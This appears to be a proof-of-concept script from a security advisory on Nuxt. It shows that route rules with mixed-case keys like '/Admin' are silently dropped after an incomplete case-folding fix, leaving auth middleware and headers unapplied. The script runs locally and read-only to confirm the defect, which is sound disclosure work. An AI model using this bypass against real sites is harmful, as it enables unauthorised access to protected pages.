// PoC — GHSA-hxvh-4h3w-prp9 : Nuxt route rules silently dropped for mixed-case
// paths (incomplete fix for CVE-2026-53721 / GHSA-mm7m-92g8-7m47).
//
// This reproduces the CORE defect using the exact matcher library Nuxt ships
// (radix3), replicating the compiled matcher logic from
// packages/nitro-server/src/index.ts and packages/nuxt/src/app/composables/manifest.ts:
//
//   export default (path) => defu({}, ...matcher('', path.toLowerCase()) ...)
//
// The fix for CVE-2026-53721 lower-cases only the LOOKUP path; the route-rule
// KEYS compiled into the matcher stay verbatim. radix3 matches segments
// case-sensitively, so any rule key with an upper-case letter (e.g. `/Admin`,
// or the key Nuxt derives from `pages/Admin.vue`) never matches — the rule is
// dropped for EVERY request casing. vue-router still serves the page
// case-insensitively (its documented default `sensitive: false`), so the page
// renders with none of its Nuxt route-rule protections (appMiddleware auth
// gate, ssr:false, per-route security headers, redirect).
//
// Benign marker: the "auth" appMiddleware / X-Frame-Options header simply
// vanish from the resolved rules. No network, no secrets, read-only.

import { createRouter, toRouteMatcher } from 'radix3'

// Rule a developer intends as an auth gate on /Admin (e.g. from pages/Admin.vue
// with defineRouteRules({ appMiddleware: 'auth' })). Plus a lowercase control.
const routeRules = {
  '/Admin':  { appMiddleware: 'auth', ssr: false, headers: { 'X-Frame-Options': 'DENY' } },
  '/public': { headers: { 'Cache-Control': 'public' } }, // control: lowercase key
}

const r = createRouter({ routes: {} })
for (const [path, data] of Object.entries(routeRules)) r.insert(path, { data })
const matcher = toRouteMatcher(r)

// Post-fix lookup: path is lower-cased (src/index.ts + manifest.ts), keys are not.
const getRouteRules = (path) =>
  Object.assign({}, ...matcher.matchAll(path.toLowerCase()).map((m) => m.data).reverse())

let bypass = false
console.log('=== protected mixed-case rule  /Admin { appMiddleware: "auth", ssr:false, X-Frame-Options } ===')
for (const req of ['/Admin', '/admin', '/ADMIN', '/aDmIn']) {
  const rules = getRouteRules(req)
  const applied = Object.keys(rules).length > 0
  console.log(
    `  request ${req.padEnd(8)} -> rules applied: ${JSON.stringify(rules).padEnd(4)}  ` +
    `auth gate: ${rules.appMiddleware ? 'ENFORCED' : 'DROPPED (bypass)'}`,
  )
  if (!rules.appMiddleware) bypass = true
}

console.log('\n=== control lowercase rule  /public ===')
const ctrl = getRouteRules('/public')
console.log(`  request /public  -> rules applied: ${JSON.stringify(ctrl)} (matches, as expected)`)

console.log('')
if (bypass && ctrl.headers) {
  console.log('[VULNERABLE] /Admin route rules DROPPED for every casing while /public (lowercase key) still matches.')
  console.log('             appMiddleware auth gate, ssr:false and X-Frame-Options are never applied ->')
  console.log('             unauthenticated visitor reaches the protected page (vue-router serves it case-insensitively).')
  process.exit(0)
} else {
  console.log('[NOT VULNERABLE] mixed-case rule matched (patched: keys are case-folded symmetrically).')
  process.exit(1)
}
